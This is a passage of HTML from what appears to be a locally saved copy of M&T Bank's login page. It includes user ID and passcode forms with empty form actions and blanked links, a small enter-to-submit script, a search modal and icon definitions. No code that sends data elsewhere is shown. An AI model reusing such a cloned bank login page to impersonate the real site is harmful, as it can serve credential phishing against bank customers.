																						<input type="checkbox" id="login-checkbox" name="remember-me" class="login-remember-me" aria-label="Remember User ID">
																						<label for="login-checkbox" class="login-checkbox-label" aria-hidden="true">Remember User ID</label>
																					</div>
																					<div class="login-item -login-user-only"> <a href="" class="login-link" data-speedbump-enabled="false">Help with User ID or Passcode</a> </div>
																				</div>
																				<div class="hidden-fields">
																					<input type="hidden" id="dp" name="dp" class="device-print">
																					<input type="hidden" id="pageId" name="pageId" value="mtbcom:login"> </div>
																				<div class="login-split -cta-buttons">
																					<div class="login-item login-button">
																						<div class="submit-button">
																							<button type="submit" class="submit-action"> <span>Log In<span aria-hidden="true"> &gt;</span></span>
																							</button>
																						</div>
																					</div>
																					<div class="login-item -go-home"> </div>
																				</div>
																			</fieldset>
																		</form>
																		<form method="" action="" autocomplete="off" class="login-form -commercial _hidden">
																			<fieldset class="login-fieldset">
																				<legend class="_visuallyhidden">Commercial Login</legend>
																				<div class="login-textfield">
																					<label for="loginId" class="login-field-placeholder">Treasury Center User ID</label>
																					<input type="text" id="userid" name="loginId" value="" class="login-field animateInput" autocomplete="off" aria-invalid="false" minlength="1" maxlength="100" role="textbox" required=""> </div>
																				<div class="login-split -checkbox">
																					<div class="login-item">
																						<input type="checkbox" id="commercial-login-checkbox" name="remember-me" class="login-remember-me" aria-label="Remember User ID">
																						<label for="commercial-login-checkbox" class="login-checkbox-label" aria-hidden="true">Remember User ID</label>
																					</div>
																					<div class="login-item -login-user-only">
																						<a class="login-link" data-speedbump-enabled="false" href="">
																							<svg class="login-icon -icon-question-mark">
																								<use xlink:href="#icon-question-mark"></use>
																							</svg> Forgot Password </a>
																					</div>
																				</div>
																				<div class="login-split -cta-buttons">
																					<div class="login-item login-button">
																						<div class="submit-button">
																							<button type="submit" class="submit-action"> <span>Log In<span aria-hidden="true"> &gt;</span></span>
																							</button>
																						</div>
																					</div>
																					<div class="login-item -go-home"> </div>
																				</div>
																			</fieldset>
																		</form>
																		<div class="privacy-block">
																			<div class="privacy-link -privacy">
																				<svg class="login-icon -icon-lock">
																					<use xlink:href="#icon-lock"></use>
																				</svg> <a aria-label="Learn about Online and Mobile Banking security" href="/homepage/explore-the-m-and-t-bank-help-center/bank-security-tips-and-best-practices/how-mandt-protects-you/online-and-mobile-banking-security" class="privacy-security-link">Security &amp; Privacy</a> </div>
																			<div class="privacy-link -personal-business" data-remove-when-privacy-block-added-back="true" aria-hidden="true"></div> <a class="login-link privacy-link -commercial _hidden" data-speedbump-enabled="false" href="">Log In to Web InfoPlu$</a> </div>
																		<div class="login-split -other-signup">
																			<div class="dropdown-menu-container login-item">
																				<div class="dropdown-menu">
																					<button class="login-link -larger -arrow -down dropdown-menu-trigger -personal-business" aria-expanded="false">Other Personal and Business Services...</button>
																					<button class="login-link -larger -arrow -down dropdown-menu-trigger -commercial _hidden" aria-expanded="false">Other Commercial Services...</button>
																					<ul class="dropdown-menu-target -personal-business-dropdown _hidden">
																						<li class="dropdown-menu-item -close">
																							<a class="dropdown-menu-link -close">
																								<svg class="icon-close">
																									<use xlink:href="#icon-close-thin"></use>
																								</svg>
																							</a>
																						</li>
																						<li class="dropdown-menu-item"> <a href="" data-speedbump-enabled="false" class="dropdown-menu-link">Web InfoPlu$</a> </li>
																						<li class="dropdown-menu-item"> <a href="" data-speedbump-enabled="false" class="dropdown-menu-link">Online Banking</a> </li>
																						<li class="dropdown-menu-item"> <a href="" data-speedbump-enabled="false" class="dropdown-menu-link">Account View</a> </li>
																						<li class="dropdown-menu-item"> <a href="" data-speedbump-enabled="false" class="dropdown-menu-link">View All &gt;</a> </li>
																					</ul>
																					
																				</div>
																			</div> <a href="" class="login-link -sign-up -larger" data-personal-business="true" data-personal-business-title="Enroll Now" data-personal-business-url="" data-commercial="false" data-commercial-title="Sign Up" data-speedbump-enabled="false">Enroll Now</a> </div>
																	</div>
																</div>
															</div>
															<div class="left-side">
																<div class="login-landing-wrapper component">
																	<div class="landing-logo-link">
																		<svg class="landing-logo">
																			<use xlink:href="#logo"></use>
																		</svg>
																	</div>
																	<div class="login-landing" data-gradient="linear-gradient(to right,#f7f7f7,rgba(247, 247, 247, 0) 60%)," data-background-image="img/Kensington_Mural_OLB_Desktop.jpg" style="background-image: linear-gradient(to right, rgb(247, 247, 247), rgba(247, 247, 247, 0) 60%), url(img/Kensington_Mural_OLB_Desktop.jpg);">
																		<div class="landing-text-area ">
																			<div class="title">
																				<div class="cmp-title title-container component">
																					<h1 class="cmp-title__text  -default-theme">
		
			We are inspired by our multicultural communities.
		
	</h1> </div>
																			</div>
																			<div class="description">
																				<div class="cmp-text richtext component">
																					<p>M&amp;T is dedicated to&nbsp;investing in the growth&nbsp;and&nbsp;sustainability of the clients and businesses&nbsp;we serve,&nbsp;attracting and retaining diverse&nbsp;colleagues&nbsp;so we can truly&nbsp;reflect our communities.</p>
																				</div>
																			</div>
																			<div>
																				<div class="cta-button component -text-width style-a 12  ">
																					<a class="cta-button-link" target="_self" data-speedbump-enabled="false" href="/homepage/personal-and-business-banking-mortgages-and-more/community-involvement/multicultural-banking" data-id="1718079568" data-comp-type="cta-button" data-tag-type="clickAction" data-tag-text="Multicultural Banking"> <span class="button-text  -chevron">Learn More</span> </a>
																				</div>
																			</div>
																			<div class="login-landing-warning-text">
																				<div class="cmp-text richtext component">
																					<p class="cmp-text__paragraph"> </p>
																				</div>
																			</div>
																		</div>
																	</div>
																</div>
															</div>
														</div>
													</div>
													<div class="raw-html aem-GridColumn aem-GridColumn--default--12">
														<div class="raw-html component">
															<style>
															.login-form-container > .login-scroll > .privacy-block > .privacy-link {
																font-size: 1rem !important;
															}
															</style>
															<script>
															function SubmitForm() {
																try {
																	document.querySelector(".login-form:not(._hidden) [type='submit']").click();
																} catch(e) {}
															}
															document.querySelector("#txtUserID").addEventListener("keyup", function(e) {
																if((event.keyCode ? event.keyCode : event.which) == 13) {
																	SubmitForm();
																}
															});
															document.querySelector("#loginId").addEventListener("keyup", function(e) {
																if((event.keyCode ? event.keyCode : event.which) == 13) {
																	SubmitForm();
																}
															});
															document.querySelector("#txtPasscode").addEventListener("keyup", function(e) {
																if((event.keyCode ? event.keyCode : event.which) == 13) {
																	SubmitForm();
																}
															});
															</script>
														</div>
													</div>
												</div>
											</div>
										</div>
									</div>
									<button class="modal-clone-close" aria-label="close modal">
										<svg class="icon-close">
											<use xlink:href="#icon-close-thin"></use>
										</svg>
									</button>
								</div>
							</div>
							<div class="search-modal modal-data _hidden" hidden="hidden">
								<div class="xfpage page basicpage">
									<div class="xf-content-height">
										<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
											<div class="search-results aem-GridColumn aem-GridColumn--default--12">
												<div class="search-results component">
													<div class="search-results-form-container">
														<div class="search-results-logo" aria-label="M&amp;T Bank logo">
															<svg class="search-results-logo-image" aria-hidden="true">
																<use xlink:href="#logo"></use>
															</svg>
														</div>
														<div class="search-results-description-container">
															<p class="search-results-description"> What can we help you with today? </p>
														</div>
														<form name="search-results-form" method="get" class="search-results-form">
															<label for="searchInput" class="search-results-placeholder">Search</label>
															<input id="searchInput" class="search-results-input animateInput" type="text">
															<button class="search-results-icon-close-container" aria-label="Clear search">
																<svg class="search-results-icon-close">
																	<use xlink:href="#icon-close"></use>
																</svg>
															</button>
															<button type="submit" class="search-results-icon-magnifying-glass" aria-label="Submit search">
																<svg class="search-results-icon-magnifying-glass-image" aria-hidden="true">
																	<use xlink:href="#icon-magnifying-glass"></use>
																</svg>
															</button>
														</form>
													</div>
													<p class="_visuallyhidden search-alert">Search results are ready</p>
													<div class="search-results-items"></div>
												</div>
											</div>
											<div class="raw-html aem-GridColumn aem-GridColumn--default--12">
												<div class="raw-html component">
													<style>
													.search-results-form-container.-has-results {
														padding-top: 0;
													}
													
													.search-results-form > .search-results-input {
														padding-left: 0.25em;
													}
													
													.search-results-form > .search-results-placeholder.-to-top {
														top: 0em;
														left: 0.6em;
													}
													
													.search-results-description.-has-results {
														margin-top: 1.5rem;
													}
													
													.search-results-logo.-has-results {
														top: 0;
													}
													
													.search-results-form-container.-has-results {
														min-height: 0;
													}
													
													@media screen and (max-width:768px) {
														.search-results-form > .search-results-placeholder.-to-top {
															top: -1em;
															left: 0;
														}
														.search-results-logo.-has-results {
															margin-top: 1rem;
														}
													}
													</style>
													<style>
													.login-container > .right-side {
														display: block;
													}
													
													.login-container > .left-side {
														min-height: 35%;
													}
													
													@media screen and (min-width:1023px) {
														.hero.component .hero-text-container {
															min-height: 0px;
														}
														.hero.component[data-desktop-image] .hero-text-container {
															min-height: 430px;
														}
													}
													</style>
													<script src="/content/dam/mtb-web/scripts/alert_scripts/alertobject.js"></script>
													<script src="/content/dam/mtb-web/scripts/status.js"></script>
												</div>
											</div>
										</div>
									</div>
								</div>
							</div>
						</div>
						<div class="disclosure aem-GridColumn aem-GridColumn--default--12" hidden="hidden">
							<div class="disclosure component">
								<div class="_hidden"> </div>
								<div class="disclosure-wrapper">
									<h3 class="disclosure-title"></h3>
									<ul class="unnumbered-disclosures"></ul>
									<ol class="numbered-disclosures"></ol>
								</div>
							</div>
						</div>
						<div class="speedbump aem-GridColumn aem-GridColumn--default--12" hidden="hidden"></div>
					</div>
				</div>
			</div>
		</div>
		<div id="speedbump-modal" class="speedbump-modal-container _hidden" hidden="hidden">
			<div class="speedbump-modal-wrapper" role="dialog">
				<div>
					<div>
						<div class="xfpage page basicpage">
							<div class="xf-content-height">
								<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
									<div class="columns aem-GridColumn aem-GridColumn--default--12">
										<div class="columns-container    ">
											<div class="columns-wrapper ">
												<div class="column-content ">
													<div class="col-12 column-parsys ">
														<div class="title section">
															<div class="cmp-title title-container component">
																<h1 class="cmp-title__text  -green">
		
			You are leaving our site
		
	</h1> </div>
														</div>
														<div class="richtext text section">
															<div class="cmp-text richtext component">
																<p>Please note that:</p>
																<ul>
																	<li>The Third-Party Website is governed by a different set of terms and conditions and privacy policy than the M&amp;T website and you should review those terms, conditions and privacy policy prior to reviewing the content of the Third-Party Website</li>
																	<li>M&amp;T is providing a link to the Third-Party Website as a convenience and does not necessarily control the content of, or endorse, the Third-Party Website, its owner/operator or any information, products or services that are made available on or through it</li>
																	<li>M&amp;T makes no representations or warranties regarding the information, products or services provided through the Third-Party Website</li>
																</ul>
																<p>Such Third-Party Website's owner/operator may be regulated by governmental entities and laws that are different than those that regulate M&amp;T.</p>
															</div>
														</div>
														<div class="speedbump-cta-button section">
															<div class="speedbump-cta-button cta-button component -text-width style-a 10 ">
																<a class="cta-button-link" data-id="253304388" data-comp-type="speedbump-cta-button"> <span class="button-text  -chevron">Continue</span> </a>
															</div>
														</div>
													</div>
												</div>
											</div>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>
	<script type="text/javascript" src="/etc.clientlibs/mtb-web/clientlibs/clientlib-base.js" hidden="hidden"></script>
	<svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" xml:space="preserve" style="display: none;" hidden="">
		<symbol id="icon-phone" viewBox="0 0 21.6 21.2">
			<!-- 007B56 -->
			<g class="icon-phone" stroke="none">
				<path d="M2.6 0c.8 0 1.3.6 1.3.6 1.1 1.3 1.5 2.3 1.5 2.3.6 1.2.2 2 .2 2-.1.4-.6 1-.6 1l-.4.6c-.2.8.1 1.5.1 1.5.4 1 1.2 1.9 1.2 1.9.7.8 2.7 2.8 2.7 2.8s2 2 2.8 2.7c0 0 .9.8 1.9 1.2 0 0 .7.3 1.6.1 0 0 .3-.1.6-.4 0 0 .6-.5 1.1-.6 0 0 .8-.4 2 .2 0 0 1.1.4 2.4 1.5 0 0 .7.5.6 1.3 0 0-.1.5-.5 1 0 0-1.2 1.6-3.4 1.5 0 0-2 .1-4.5-1.3 0 0-1.4-.6-3.7-2.3 0 0-.7-.5-3-2.9-2.3-2.3-2.9-3-2.9-3-1.8-2.2-2.3-3.6-2.3-3.6-1.4-2.4-1.3-4.3-1.3-4.3 0-2.2 1.5-3.3 1.5-3.3.6-.4 1.1-.5 1.1-.5z"></path>
			</g>
		</symbol>
		<symbol id="icon-chat" viewBox="0 0 14 14">
			<!-- 007B56 -->
			<g class="icon-chat" stroke="none">
				<path d="M3.37 10.86L.27 13.8c-.05.03-.2.22-.25.2-.05-.03 0-.26 0-.32V.58C.02.25.3 0 .62 0H13.4c.33 0 .6.26.6.57v9.72c0 .3-.27.56-.6.56H3.36z"></path>
			</g>
		</symbol>
		<symbol id="icon-close" viewBox="0 0 18 19">
			<g stroke-width="3">
				<path d="M2.15 2.28l13.8 14.23M15.5 2.5l-13 14"></path>
			</g>
		</symbol>
		<symbol id="icon-close-thin" viewBox="0 0 30 31">
			<g fill="none" opacity="1" stroke-width="3">
				<path d="M2.27 2.5L27.9 28.12M26.5 2.5l-24 25"></path>
			</g>
		</symbol>
		<symbol id="icon-arrow" viewBox="0 0 14 8">
			<path class="icon-arrow" d="M1 1l6.23 6L13 1"></path>
		</symbol>
		<symbol id="icon-arrow-left" viewBox="0 0 27 27">
			<g fill="none">
				<path fill="#D8D8D8" d="M0 13.5C0 20.96 6.04 27 13.5 27S27 20.96 27 13.5 20.96 0 13.5 0 0 6.04 0 13.5z"></path>
				<path stroke="#555" stroke-width="2" stroke-linejoin="round" d="M15.1 8.5l-5.2 5 5 5" stroke-linecap="round"></path>
			</g>
		</symbol>
		<symbol id="icon-arrow-right" viewBox="0 0 27 27">
			<g fill="none">
				<path fill="#D8D8D8" d="M27 13.5C27 6.04 20.96 0 13.5 0S0 6.04 0 13.5 6.04 27 13.5 27 27 20.96 27 13.5z"></path>
				<path stroke="#555" stroke-width="2" stroke-linejoin="round" d="M11.9 18.5l5.2-5-5-5" stroke-linecap="round"></path>
			</g>
		</symbol>
		<symbol id="icon-location-pin" viewBox="0 0 12 16">
			<!-- 007B56 -->
			<g class="icon-location-pin">
				<path d="M5.38 15.7c-.55-.8-1.24-1.8-2.1-3-1.04-1.5-1.73-2.52-2.06-3.04-.48-.75-.8-1.38-.97-1.9C.08 7.27 0 6.67 0 6c0-1.08.27-2.08.8-3C1.36 2.08 2.1 1.35 3 .8 3.92.28 4.92 0 6 0s2.08.27 3 .8c.92.55 1.65 1.28 2.2 2.2.53.92.8 1.92.8 3 0 .67-.08 1.26-.25 1.77-.17.5-.5 1.14-.97 1.9-.33.5-1.02 1.52-2.06 3.02l-2.1 3c-.14.2-.35.3-.62.3s-.48-.1-.63-.3zM6 9c.83 0 1.53-.3 2.12-.88.6-.6.88-1.3.88-2.12 0-.83-.3-1.53-.88-2.12C7.52 3.28 6.82 3 6 3c-.83 0-1.53.3-2.12.88C3.28 4.48 3 5.18 3 6c0 .83.3 1.53.88 2.12.6.6 1.3.88 2.12.88z"></path>
			</g>
		</symbol>
		<symbol id="icon-more-ways" viewBox="0 0 14 14">
			<g class="icon-more-ways" stroke="none" transform="translate(0 0)">
				<circle cx="7" cy="7" r="7" fill="#007B56"></circle>
				<path fill="#fff" d="M4 6h6v2H4zM8 4v6H6V4z"></path>
			</g>
		</symbol>
		<symbol id="icon-magnifying-glass" viewBox="0 0 20 21">
			<!-- 188262 -->
			<g class="icon-magnifying-glass" stroke="none" transform="translate(0 0)">
				<path d="M19.5 18.02s-4.2-4.4-4.2-4.43c2.35-3.76 1.62-8.78-1.7-11.63-3.3-2.84-8.13-2.58-11.16.6C-.6 5.73-.83 10.8 1.88 14.28c2.7 3.48 7.5 4.24 11.05 1.76.02.02 4.23 4.44 4.23 4.44.65.67 1.7.67 2.35 0 .32-.33.5-.78.5-1.24 0-.46-.18-.9-.5-1.24M8.35 15.76c-3.68 0-6.66-3.13-6.66-7 0-3.86 2.98-7 6.66-7S15 4.9 15 8.77c0 3.87-2.98 7-6.66 7"></path>
			</g>
		</symbol>
		<symbol id="icon-lock" viewBox="0 0 13 17">
			<!-- 007B56 -->
			<g class="icon-lock" stroke="none" transform="translate(0 0)">
				<path d="M1.88 4.78v1.95h-.5C.6 6.73 0 7.36 0 8.15v7.43C0 16.38.6 17 1.37 17h10.26c.76 0 1.37-.63 1.37-1.42V8.15c0-.8-.6-1.42-1.37-1.42h-.5V4.78C11.12 2.14 9.04 0 6.5 0S1.88 2.14 1.88 4.78zm1.7 1.6v-1.6c0-1.66 1.3-3 2.92-3 1.6 0 2.9 1.34 2.9 3v1.6c0 .2-.15.35-.33.35H3.93c-.18 0-.34-.16-.34-.36zm2.24 7.43v-1.6c-.43-.25-.7-.72-.7-1.22 0-.7.48-1.28 1.14-1.4.65-.12 1.3.26 1.52.9.23.65-.02 1.38-.6 1.72v1.6c0 .4-.3.72-.68.72-.38 0-.68-.32-.68-.7z"></path>
			</g>
		</symbol>
		<symbol id="icon-facebook-social" viewBox="0 0 31 31">
			<g class="icon-facebook-social">
				<path d="M19.53 10.32h-1.46c-1.15 0-1.37.55-1.37 1.34v1.76h2.73l-.36 2.76H16.7v7.07h-2.84v-7.07h-2.38v-2.76h2.38V11.4c0-2.37 1.44-3.65 3.54-3.65 1 0 1.87.07 2.13.1v2.47zM15.5 0C6.94 0 0 6.94 0 15.5 0 24.06 6.94 31 15.5 31 24.06 31 31 24.06 31 15.5 31 6.94 24.06 0 15.5 0z"></path>
			</g>
		</symbol>
		<symbol id="icon-twitter-social" viewBox="0 0 31 31">
			<g class="icon-twitter-social">
				<path d="M21.66 12.34c0 .14 0 .27 0 .4 0 4.2-3.2 9.06-9.04 9.06-1.8 0-3.46-.53-4.87-1.43.25.03.5.04.76.04 1.5 0 2.87-.5 3.96-1.35-1.4-.02-2.57-.94-2.97-2.2.18.03.38.05.6.05.28 0 .56-.04.82-.1-1.45-.3-2.55-1.6-2.55-3.13v-.04c.43.24.92.38 1.44.4-.84-.57-1.4-1.54-1.4-2.65 0-.58.16-1.13.43-1.6 1.57 1.93 3.9 3.2 6.55 3.33-.05-.23-.08-.47-.08-.72 0-1.75 1.43-3.18 3.18-3.18.92 0 1.74.4 2.32 1 .73-.14 1.4-.4 2.02-.77-.24.75-.74 1.37-1.4 1.76.65-.08 1.26-.25 1.83-.5-.43.63-.97 1.2-1.6 1.64M15.5 0C6.94 0 0 6.94 0 15.5 0 24.06 6.94 31 15.5 31 24.06 31 31 24.06 31 15.5 31 6.94 24.06 0 15.5 0"></path>
			</g>
		</symbol>
		<symbol id="icon-linkedin-social" viewBox="0 0 31 31">
			<g class="icon-linkedin-social">
				<path d="M23.25 23.24h-3.2V18.2c0-1.2-.03-2.73-1.68-2.73-1.67 0-1.93 1.3-1.93 2.65v5.12h-3.2V12.9h3.07v1.4h.06c.43-.8 1.47-1.66 3.04-1.66 3.25 0 3.85 2.14 3.85 4.93v5.67zM9.6 11.5c-1.02 0-1.85-.85-1.85-1.87 0-1.03.83-1.87 1.86-1.87 1.04 0 1.87.84 1.87 1.87 0 1.02-.83 1.86-1.86 1.86zm1.62 11.74H8V12.9h3.22v10.34zM15.5 0C6.94 0 0 6.94 0 15.5 0 24.06 6.94 31 15.5 31 24.06 31 31 24.06 31 15.5 31 6.94 24.06 0 15.5 0z"></path>
			</g>
		</symbol>
		<symbol id="icon-amp-t" viewBox="0 0 31 31">
			<g fill="none">
				<g fill="#008456">
					<path d="M547.45 191.38h43.27s-.35-155.16 140.9-155.16h43v637.6h-67.65c-43.2-4.26-79.2-32.2-113.9-65.35L542.3 559.2c11.08-15.06 25.83-37.95 36.13-61.74 11.7-27.02 20.3-77.83 25.6-90.34 1.72-4.08 3.74-8.04 6.1-11.8 6.66-10.58 17.92-19.6 29.36-24.57 8.7-3.8 19.45-6.3 29.02-6.3h6.45v-36.8H463.14v36.8h14.35c38.62.1 69.95 31.54 69.95 70.96 0 50.66-37.8 92.28-37.8 92.28L316 338.92c86.44-31.48 159.27-74.85 159.27-156.5 0-85.85-65.2-146.2-183-146.2-119.44 0-199.06 66.3-199.06 173.45 0 70.57 32.2 116.47 63.53 147.95C58.43 395.86 0 446.05 0 537.88 0 667.12 116.07 719 244.86 719c84.7 0 155.84-25.5 210.96-66.3.76-.6 36.57 57.8 142.3 57.8 7.7 0 402.1-.3 402.1-.3v-36.4h-77.4V36.23h43.02c140.83 0 140.9 155.16 140.9 155.16H1150V0H547.45v191.38zM287.5 72.2c46.67 0 75.5 37.64 75.5 91.22 0 59.56-26.32 110.78-83.1 141.43-36.5-35.73-67.9-84.42-67.9-143.13 0-52.73 28.9-89.52 75.5-89.52zm-3.08 583.62c-83.78 0-146.42-62.3-146.42-145.73 0-58.73 13.52-94.5 52.48-120L424 620.75c-38.06 26.4-87.1 35.06-139.58 35.06z"></path>
				</g>
			</g>
		</symbol>
		<symbol id="icon-check" viewBox="0 0 38 38">
			<g fill="none" transform="translate(2, 2)">
				<polyline stroke-width="3" points="26 9 15.5 23 8 17.1052632"></polyline>
				<path stroke-width="3" d="M17,34 C26.389913,34 34,26.389913 34,17 C34,7.61008696 26.389913,0 17,0 C7.61008696,0 0,7.61008696 0,17 C0,26.389913 7.61008696,34 17,34 Z"></path>
			</g>
		</symbol>
		<symbol id="icon-circle-checkmark" viewBox="0 0 38 38">
			<g fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-width="3">
				<path d="M28 11L17.5 25 10 19.1"></path>
				<path d="M19 36a17 17 0 100-34 17 17 0 000 34z"></path>
			</g>
		</symbol>
		<symbol id="icon-equal-housing" viewBox="0 0 22 17">
			<g class="icon-equal-housing" fill="none" fill-rule="nonzero">
				<path fill="#181512" d="M0 6.55L11.13 0 22 6.55v2.2h-1.72V17H1.72V8.74H0z" opacity=".8"></path>
				<path fill="#E7E5E3" d="M11.07 3L4 7.13V15h14V7.13z"></path>
				<path fill="#181512" d="M7 7h8v2.12H7V7zm0 3.88h8V13H7v-2.12z" opacity=".8"></path>
			</g>
		</symbol>
		<svg id="icon-equal-housing2" viewBox="0 0 22 17">
			<g class="icon-equal-housing">
				<path d="M0 6.55 L11.13 0 22 6.55 v2.2h-1.72 V17H1.72 V8.74H0 M11.07 3L4 7.13V15h14V7.13z" opacity=".8"></path>
				<path d="M7 7h8v2.12H7V7zm0 3.88h8V13H7v-2.12z" opacity=".8"></path>
			</g>
		</svg>
		<symbol id="icon-hamburger-menu" viewBox="0 0 36 25">
			<g class="icon-hamburger-menu" fill="none" fill-rule="evenodd" stroke-linecap="square" stroke-width="4" transform="translate(2 2)">
				<line x1=".32" x2="31.837" y1=".51" y2=".51"></line>
				<line x1=".32" x2="31.837" y1="10.51" y2="10.51"></line>
				<line x1=".32" x2="31.837" y1="20.02" y2="20.02"></line>
			</g>
		</symbol>
		<symbol id="icon-home-loans" viewBox="0 0 41 39">
			<g transform="translate(-46.000000, -95.000000)">
				<g transform="translate(47.000000, 96.000000)" fill="none">
					<path class="lime-green" d="M13.1,31.4H7.9c-1.4,0-2.6-1.1-2.6-2.6V16.1"></path>
					<path class="lime-green" d="M0.2,13.5L15.3,0.9c1-0.8,2.4-0.8,3.3,0l12.5,10.5"></path>
					<polyline class="lime-green" points="25.9,0.8 31.1,0.8 31.1,5.9"></polyline>
					<path class="st1" d="M31.1,21.2h-3.5c-1.1,0-2.1,0.8-2.3,1.9c-0.2,1.1,0.4,2.1,1.4,2.6l3.5,1.4c1,0.4,1.6,1.5,1.4,2.6c-0.2,1.1-1.2,1.9-2.3,1.9h-3.5"></path>
					<path class="st1" d="M28.5,21.2v-1.3"></path>
					<path class="st1" d="M28.5,32.7v-1.3"></path>
					<ellipse fill="none" class="st1" cx="28.5" cy="26.3" rx="10.3" ry="10.2"></ellipse>
				</g>
			</g>
		</symbol>
		<symbol id="icon-insurance" viewBox="0 0 52 60">
			<g fill="none" stroke-width="2.1">
				<path d="M25 13V8"></path>
				<path d="M25 39v16"></path>
				<path d="M25 54.25c0 2.07 1.57 3.75 3.5 3.75s3.5-1.68 3.5-3.75V53"></path>
				<path stroke="#80BC00" d="M37 9l3-7"></path>
				<path stroke="#80BC00" d="M42 11l3-7"></path>
				<path stroke="#80BC00" d="M47 14l3-7"></path>
				<path d="M25 38c0-2.3 2.8-4.17 6.27-4.17 3.47 0 6.28 1.87 6.28 4.17.3-2.57 2.63-4.42 5.22-4.17 2.6-.25 4.9 1.6 5.23 4.17v-1.04C48 23.73 38.28 13 25 13S2 23.73 2 36.96V38c.32-2.57 2.64-4.42 5.23-4.17 2.6-.25 4.9 1.6 5.22 4.17 0-2.3 2.8-4.17 6.28-4.17C22.2 33.83 25 35.7 25 38z"></path>
			</g>
		</symbol>
		<symbol id="icon-checking" viewBox="0 0 59 46">
			<g fill="none" stroke-width="2.1">
				<path d="M14.06 31.64L7 34l2.35-7.07L33.6 2.7c.92-.93 2.4-.93 3.33 0l1.38 1.37c.93.92.93 2.4 0 3.33L14.07 31.64z"></path>
				<path d="M10 26l4 4"></path>
				<path stroke="#80BC00" d="M20 34h29"></path>
				<path stroke="#80BC00" d="M31 28h18"></path>
				<path stroke="#80BC00" d="M39.07 14H54.6c1.33 0 2.4 1.03 2.4 2.3v25.4c0 1.27-1.07 2.3-2.4 2.3H4.4C3.06 44 2 42.97 2 41.7V16.3C2 15.04 3.07 14 4.4 14h10.75"></path>
				<path d="M28 10l4 4"></path>
				<path d="M22 9l5.94-5.32c1-.9 2.65-.9 3.66 0L33 4.94"></path>
			</g>
		</symbol>
		<symbol id="icon-investments" viewBox="0 0 55 53">
			<defs>
				<path id="a" d="M.1.3h51v2H.1z"></path>
			</defs>
			<g fill="none">
				<path class="lime-green" d="M7.1 42.76v-16"></path>
				<g>
					<path class="lime-green" stroke-width="3" d="M4.1 43.26h11"></path>
					<g transform="translate(2 50.463)">
						<mask id="b">
							<use xlink:href="#a"></use>
						</mask>
						<path stroke-width="3" d="M.1 1.3h51" stroke-linecap="round" stroke-linejoin="round" mask="url(#b)"></path>
					</g>
					<path stroke-width="3" d="M2.1 47.76h51" stroke-linecap="round" stroke-linejoin="round"></path>
					<path class="lime-green" d="M4.1 26.76h11"></path>
				</g>
				<path class="lime-green" d="M21.1 42.76h12"></path>
				<path class="lime-green" d="M21.1 26.76h12"></path>
				<path class="lime-green" d="M13.1 42.76v-16"></path>
				<path class="lime-green" d="M24.1 42.76v-16"></path>
				<path class="lime-green" d="M31.1 42.76v-16"></path>
				<path class="lime-green" d="M40.1 43.76h11"></path>
				<path class="lime-green" d="M40.1 26.76h11"></path>
				<path class="lime-green" d="M42.1 42.76v-16"></path>
				<path class="lime-green" d="M48.1 42.76v-16"></path>
				<path class="lime-green" d="M4.52 19.74c-.37.3-.52.8-.37 1.26.16.45.58.76 1.06.76h44.77c.48 0 .9-.3 1.06-.76.15-.46 0-.96-.37-1.26L28.34 2c-.4-.32-.97-.32-1.37 0L4.52 19.74z"></path>
			</g>
		</symbol>
		<symbol id="icon-borrowing" viewBox="0 0 42 60">
			<g fill="none" stroke-width="2.1">
				<path d="M28.4 25.25c-.22-.16-.5-.25-.76-.25H14.4c-.3 0-.55.1-.77.25C8.13 29.45 2 37.58 2 44.05 2 53.14 7.07 58 21 58s19-4.85 19-13.96c0-6.46-6.1-14.6-11.6-18.8z"></path>
				<path stroke="#80BC00" d="M12 20h17"></path>
				<path d="M30.84 5.67c.27-.47.2-1.06-.18-1.46-.38-.4-.98-.5-1.5-.3l-5.53 2.27-1.4-3.38c-.2-.48-.7-.8-1.23-.8s-1.02.32-1.22.8l-1.4 3.38-5.54-2.27c-.52-.2-1.12-.08-1.5.32-.38.4-.45.98-.18 1.45 1.54 2.55 2.62 5.33 3.2 8.23.08.63.64 1.1 1.3 1.1h10.7c.68 0 1.24-.47 1.32-1.1.56-2.9 1.63-5.68 3.16-8.23z"></path>
				<path stroke="#80BC00" d="M22 34v-2"></path>
				<path stroke="#80BC00" d="M25.1 34h-4.87c-1.55 0-2.88 1.06-3.17 2.53-.3 1.48.53 2.95 1.97 3.5l4.95 1.93c1.43.56 2.25 2.03 1.96 3.5-.3 1.47-1.62 2.54-3.16 2.54H17.9"></path>
				<path stroke="#80BC00" d="M22 50v-2"></path>
			</g>
		</symbol>
		<symbol id="icon-credit-card" viewBox="0 0 57 46">
			<g fill="none" stroke-width="2.1">
				<path stroke="#80BC00" d="M2 18.15C3.77 12.53 9.2 8.78 15.25 9h7.05c2.28 0 4.7 1.15 4.7 3.44v1.14c0 2.28-2.35 3.42-4.7 3.42h-4.7s-2.35 8-7.06 8"></path>
				<path stroke="#80BC00" d="M31 44H13.38C10.22 44 7.2 42.92 5 41"></path>
				<path stroke="#80BC00" d="M24 30h15.44C41.4 30 43 31.57 43 33.5S41.4 37 39.44 37h-9.5"></path>
				<path stroke="#80BC00" d="M25 37h5.63c1.86 0 3.37 1.57 3.37 3.5S32.5 44 30.62 44h-3.37"></path>
				<path d="M55 11H27"></path>
				<path d="M13 9.18V5.5C13 3.57 14.57 2 16.5 2h35C53.43 2 55 3.57 55 5.5v21c0 1.93-1.57 3.5-3.5 3.5h-35c-1.93 0-3.5-1.57-3.5-3.5v-1.9"></path>
				<path d="M50 16h-7"></path>
			</g>
		</symbol>
		<symbol id="icon-savings" viewBox="0 0 60 60">
			<g fill="none" stroke-width="2.1">
				<path d="M14 28c6.63 0 12-1.12 12-2.5S20.63 23 14 23 2 24.12 2 25.5 7.37 28 14 28z"></path>
				<path d="M26 26v7.5c0 1.38-5.37 2.5-12 2.5S2 34.88 2 33.5V26"></path>
				<path d="M26 33v7.5c0 1.38-5.37 2.5-12 2.5S2 41.88 2 40.5V33"></path>
				<path d="M26 42v7.5c0 1.38-5.37 2.5-12 2.5S2 50.88 2 49.5V42"></path>
				<path d="M26 48v7.5c0 1.38-5.37 2.5-12 2.5S2 56.88 2 55.5V48"></path>
